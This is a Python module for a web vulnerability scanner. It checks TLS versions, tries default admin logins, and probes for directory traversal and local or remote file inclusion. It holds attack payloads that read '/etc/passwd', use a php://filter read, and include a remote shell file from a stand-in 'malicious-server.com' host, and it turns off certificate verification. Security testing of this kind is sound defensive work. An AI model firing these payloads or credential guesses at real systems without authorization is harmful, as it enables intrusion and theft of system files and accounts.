import ssl
import socket
import requests
from typing import Dict, List
import logging
from urllib.parse import urljoin
import concurrent.futures
from .config import USER_AGENT, HEADERS, DEFAULT_TIMEOUT, MAX_THREADS

class VulnerabilityDetector:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.headers = HEADERS
        self.timeout = DEFAULT_TIMEOUT
        self.max_threads = MAX_THREADS
        self.default_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root'),
            ('admin', ''),
            ('admin', 'password123')
        ]
        self.traversal_payloads = [
            '../../../etc/passwd',
            '..\..\Windows\system.ini',
            '....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        self.file_inclusion_payloads = [
            '/etc/passwd',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'http://malicious-server.com/shell.txt'
        ]

    def check_ssl_vulnerabilities(self, host: str, port: int = 443) -> Dict:
        """Check for SSL/TLS vulnerabilities"""
        results = {
            "ssl_version": None,
            "cipher_suite": None,
            "vulnerabilities": []
        }

        try:
            context = ssl.create_default_context()
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    results["ssl_version"] = ssock.version()
                    results["cipher_suite"] = ssock.cipher()
                    
                    # Check for outdated SSL/TLS versions
                    if "TLSv1.0" in ssock.version() or "SSLv3" in ssock.version():
                        results["vulnerabilities"].append({
                            "type": "outdated_protocol",
                            "details": f"Using outdated protocol: {ssock.version()}"
                        })

        except ssl.SSLError as e:
            results["vulnerabilities"].append({
                "type": "ssl_error",
                "details": str(e)
            })
        except Exception as e:
            self.logger.error(f"SSL check error: {e}")

        return results

    def check_default_credentials(self, url: str) -> Dict:
        """Test for default credentials on common login endpoints"""
        results = {
            "tested_credentials": [],
            "vulnerable_endpoints": []
        }

        # Force HTTP instead of HTTPS for local testing
        if url.startswith("https://"):
            url = url.replace("https://", "http://")

        login_endpoints = ['/login', '/admin', '/wp-admin', '/administrator']
        
        for endpoint in login_endpoints:
            full_url = urljoin(url, endpoint)
            for username, password in self.default_credentials:
                try:
                    response = requests.post(full_url, 
                                          data={'username': username, 'password': password},
                                          allow_redirects=False,
                                          timeout=5,
                                          verify=False)  # Disable SSL verification
                    
                    results["tested_credentials"].append({
                        "endpoint": endpoint,
                        "username": username,
                        "password": password,
                        "status_code": response.status_code
                    })

                    # Check for successful login (this is a basic check)
                    if response.status_code in [302, 200] and "error" not in response.text.lower():
                        results["vulnerable_endpoints"].append({
                            "endpoint": endpoint,
                            "credentials": f"{username}:{password}"
                        })

                except Exception as e:
                    self.logger.error(f"Login test error at {endpoint}: {e}")

        return results

    def check_directory_traversal(self, url: str) -> Dict:
        """Test for directory traversal vulnerabilities"""
        results = {
            "tested_paths": [],
            "potential_vulnerabilities": []
        }

        for payload in self.traversal_payloads:
            full_url = urljoin(url, payload)
            try:
                response = requests.get(full_url, timeout=5)
                results["tested_paths"].append(payload)

                # Check for common indicators of successful traversal
                if any(indicator in response.text for indicator in ['root:', 'WIN.INI', '[extension]']):
                    results["potential_vulnerabilities"].append({
                        "payload": payload,
                        "evidence": "Found sensitive content in response"
                    })

            except Exception as e:
                self.logger.error(f"Directory traversal test error: {e}")

        return results

    def check_file_inclusion(self, url: str) -> Dict:
        """Test for Local/Remote File Inclusion vulnerabilities"""
        # Force HTTP instead of HTTPS
        if url.startswith("https://"):
            url = url.replace("https://", "http://")
        
        results = {
            "tested_payloads": [],
            "potential_vulnerabilities": []
        }

        params = ['page', 'file', 'include', 'doc', 'pdf', 'filename']

        for param in params:
            for payload in self.file_inclusion_payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(test_url, 
                                         timeout=5,
                                         verify=False,  # Disable SSL verification
                                         allow_redirects=True)
                    results["tested_payloads"].append({
                        "param": param,
                        "payload": payload
                    })

                    # Check for common LFI/RFI indicators
                    if any(indicator in response.text for indicator in 
                          ['root:', 'PHP Version', 'eval()', '<?php']):
                        results["potential_vulnerabilities"].append({
                            "param": param,
                            "payload": payload,
                            "type": "LFI/RFI"
                        })

                except Exception as e:
                    self.logger.error(f"File inclusion test error: {e}")

        return results

    def run_all_checks(self, target: str, port: int = 443) -> Dict:
        """Run all vulnerability checks"""
        all_results = {}
        
        # Force HTTP for localhost/testing
        if "localhost" in target or "127.0.0.1" in target:
            target_url = f"http://{target}"
        else:
            target_url = f"https://{target}"

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Skip SSL check for localhost
            if not "localhost" in target:
                ssl_future = executor.submit(self.check_ssl_vulnerabilities, target, port)
                all_results["ssl_vulnerabilities"] = ssl_future.result()
            
            creds_future = executor.submit(self.check_default_credentials, target_url)
            traversal_future = executor.submit(self.check_directory_traversal, target_url)
            inclusion_future = executor.submit(self.check_file_inclusion, target_url)

            all_results["default_credentials"] = creds_future.result()
            all_results["directory_traversal"] = traversal_future.result()
            all_results["file_inclusion"] = inclusion_future.result()

        return all_results 